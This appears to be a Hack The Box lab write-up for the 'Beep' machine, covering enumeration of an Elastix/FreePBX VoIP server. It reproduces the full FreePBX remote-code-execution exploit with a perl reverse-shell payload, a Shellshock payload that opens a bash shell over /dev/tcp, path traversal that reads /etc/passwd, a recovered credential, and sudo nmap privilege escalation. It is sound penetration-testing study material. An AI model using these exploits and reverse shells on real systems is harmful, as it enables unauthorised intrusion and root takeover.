# Beep HTB, IP 10.10.10.7

# Initial Enumeration

**1. nmap -sC -sV 10.10.10.7**

![b1](https://user-images.githubusercontent.com/15195048/93913785-6e211580-fcba-11ea-93d2-58d3c0990444.png)

**2. ./nmapAutomator 10.10.10.7 All**

![b2](https://user-images.githubusercontent.com/15195048/93913788-6f524280-fcba-11ea-8e5c-9c03c465480e.png)


**3. Searchsploit**
searchsploit FREEpbx, Elastix

![b3](https://user-images.githubusercontent.com/15195048/93913790-6fead900-fcba-11ea-98d1-53d8796cbb71.png)

-------------------------------------------------------------------------------------------------------------------------------------------------------

# Port Enumeration
## 1. Enumerating Port 111 and 877 Rpcbind service
These 2 ports are used by rpcbind service. Let’s see if anything interesting by executing the following command:
**rpcinfo -p 10.10.10.7**
Nothing here!!

## 2. Enumerating port 80 & 443
Visit the URL to port 80 redirects us to port 443 (https) with a login form of Elastix application.

**ELASTIX SERVER:**

**Notes:**

1. Asterisk is the software that allows you to have to functionality of a pbx with a pc or a server. It does not have a graphical interface and most of the configuration is do editing text files. There are several web interfases for Asterisk and the most popular is freePBX.
2. Elastix includes freepbx, Asterisk and our modules to administrate Asterisk. We also include other software use for email, chat, fax, etc... that can be use together with Asterisk.
3. With elastix you can have the pbx ready to configure 20 minutes after the installation.
4. Anything that runs Linux would be a good place to run Asterisk. Of course it depends how many concurrents calls you are going to have.

**Interesting files**
In elastix version 1.4
Backup location : /var/lib/asterisk/backups/
In latest versions
Backup location : /var/www/html/backup/
or
Backup location : /var/www/backup/

![b4](https://user-images.githubusercontent.com/15195048/93913794-70836f80-fcba-11ea-8a48-34a203e94d8d.png)


**SIP** is an application-layer control protocol that can establish, modify, and terminate multimedia sessions (conferences) such as Internet telephony calls. SIP can also invite participants to already existing sessions, such as multicast conferences.
**SIP** employs design elements similar to the HTTP request/response transaction model. Each transaction consists of a client request that invokes a particular method or function on the server and at least one response. SIP reuses most of the header fields, encoding rules and status codes of HTTP, providing a readable text-based format.
Each resource of a SIP network, such as a user agent or a voicemail box, is identified by a URI, based on the general standard syntax also used in Web services and e-mail. The URI scheme used for SIP is sip: and a typical SIP URI is of the form: sip:username:password@host:port
**SIP** clients typically use TCP or UDP on port numbers 5060 and/or 5061 to connect to SIP servers and other SIP endpoints. Port 5060 is commonly used for non-encrypted signaling traffic whereas port 5061 is typically used for traffic encrypted with TLS. SIP is primarily used in setting up and tearing down voice or video calls.
And, a little about Asterisk and FreePBX:
Asterisk is a software implementation of a telephone private branch exchange (PBX). Like any PBX, it allows attached telephones to make calls to one another, and to connect to other telephone services, such as the public switched telephone network (PSTN) and Voice over Internet Protocol (VoIP) services.
FreePBX is an open source GUI that controls and manages Asterisk
An IP PBX ("Internet Protocol private branch exchange") is a system that connects telephone extensions to the public switched telephone network (PSTN) and provides internal communication for a business

I found an awesome tool suite **SIPVicious**

**SIPVicious suite** is a set of tools that can be used to audit SIP based VoIP systems. It currently consists of the folowing tools:
**svmap** – this is a sip scanner. Lists SIP devices found on an IP range
**svwar** – identifies active extensions on a PBX
**svcrack** – an online password cracker for SIP PBX
**svreport** – manages sessions and exports reports to various formats
**svcrash** – attempts to stop unauthorized svwar and svcrack scans

![b5](https://user-images.githubusercontent.com/15195048/93913796-711c0600-fcba-11ea-819e-56d97a0f2e0f.png)

**Interesting Files**

https://10.10.10.7/admin/reports.php

https://10.10.10.7/recordings/index.php

**Resources:**
https://chousensha.github.io/blog/2014/10/07/pentest-lab-vulnvoip/
https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/

**FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
############################################################
# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
# Google Dork: oy vey
# Date: March 23rd, 2012
# Author: muts
# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
# Tested on: multiple
# CVE : notyet
# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
############################################################
# Discovered by Martin Tschirsich
# http://seclists.org/fulldisclosure/2012/Mar/234
# http://www.exploit-db.com/exploits/18649
############################################################
import urllib
rhost="172.16.254.72"
lhost="172.16.254.223"
lport=443
extension="1000"

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url)

# On Elastix, once we have a shell, we can escalate to root:
# root@bt:~# nc -lvp 443
# listening on [any] 443 ...
# connect to [172.16.254.223] from voip [172.16.254.72] 43415
# id
# uid=100(asterisk) gid=101(asterisk)
# sudo nmap --interactive

# Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
# Welcome to Interactive Mode -- press h <enter> for help
# nmap> !sh
# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Modifications:** rhost, lhost, lport, extension.!!!!!

Finding SIP extension:
(example: external calls, 0 extension)

**SIPVicious tool** Installation: 
Kali install:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
apt-get install sipvicious
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
General install:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
git clone https://github.com/EnableSecurity/sipvicious.git
python3 setup.py install
sipvicious_svmap -h
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## 1 Exploit  FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution, asterisk user: 
**python 18650.py**


Error: ssl certificate. After searching in google:
If you just want to bypass verification, you can create a new SSLContext. By default newly created contexts use CERT_NONE.

**Modifications:**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
import urllib2
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

urllib2.urlopen("https://your-test-server.local", context=ctx)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Resource:https://stackoverflow.com/questions/19268548/python-ignore-certificate-validation-urllib2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo -l
nmap --interactive
sudo -l 
sudo nmap --interactive
!sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I tried several python libraries and funtions in order to ignore and bypass ssl Certificate but with no luck! Some people say that the synchronization of time could be helpful but this is not possible due to our vpn connection!

**Solution: Pass the requests through BurpSUITE**
**Notes:**
curl, dirb έχουν -k #ignore certificates
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
import requests
rhost="10.10.10.7"
lhost="10.10.14.9"
lport=8888
extension="233"

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%>
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

r = requests.get(url, proxies=proxies, verify=False)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



**Burp Suite**


**Attacker:**
nc -lvp 8888



## 2 Second Exploit, asterisk user: 
Dirb results showed the following url path:
https://10.10.10.7/vtigercrm/



**vtiger CRM 5.1.0**



## Path Traversal
URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action


URL: https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action



**Credentials:**
admin:jEhdIekWmdjE

**ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1**


## 3. Enumerating port 10000

Webmin is a web-based interface for system administration for Unix. Using any modern web browser, you can setup user accounts, Apache, DNS, file sharing and much more. Webmin removes the need to manually edit Unix configuration files like /etc/passwd, and lets you manage a system from the console or remotely.
  
**searchsploit webmin**
  
## Shellshock explanation








**In the url session_login.cgi**
**Test shellshock cgi...**
**() { :; }; sleep 11**

**Burp Suite**


**() { :; }; bash -i &> /dev/tcp/10.10.14.12/9980 0>&1**


## 4. Enumerating port 25 SMTP 

I will send a malicious e-mail and got a reverse shell.

**telnet 10.10.10.7 25 it works so.**

**Keywords:** “EHLO Host”, “VRFY user” “mail from:” "rcpt tp:"

We sent a php shell code within the mail. Lets try to execute the payload with LFI vulnerability. We can found our sent e-mail in 
/var/mail/asterisk location. 
We can read with burp suite or curl to execute the php shell.

User.txt
Root.txt
